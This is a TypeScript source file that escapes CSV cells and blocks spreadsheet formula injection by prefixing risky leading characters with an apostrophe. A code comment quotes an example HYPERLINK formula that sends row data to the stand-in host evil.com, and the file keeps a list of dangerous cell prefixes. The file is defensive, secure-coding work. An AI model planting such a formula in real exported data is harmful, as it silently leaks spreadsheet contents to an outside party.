// CSV escaping with formula-injection protection.
//
// Excel, Google Sheets, and Numbers all interpret a cell starting with
// `=`, `+`, `-`, `@`, or a tab/CR as a formula. A field like
//   =HYPERLINK("http://evil.com/?leak="&A1, "Click")
// would silently exfiltrate other row data when the victim opens the
// exported CSV. We neutralize the prefix with a leading apostrophe — a
// well-known mitigation that displays correctly while preventing
// evaluation.
//
// Reference: OWASP "CSV Injection" cheat sheet.

const DANGEROUS_PREFIXES = ["=", "+", "-", "@", "\t", "\r"];

export function escapeCsvCell(
  value: string | number | null | undefined,
): string {
  if (value === null || value === undefined) return "";
  let s = String(value);

  if (DANGEROUS_PREFIXES.some((p) => s.startsWith(p))) {
    s = `'${s}`;
  }

  if (/[",\n\r]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

export function buildCsv(
  headers: readonly string[],
  rows: readonly (readonly (string | number | null | undefined)[])[],
): string {
  const lines = [headers.map(escapeCsvCell).join(",")];
  for (const row of rows) {
    lines.push(row.map(escapeCsvCell).join(","));
  }
  return lines.join("\r\n");
}
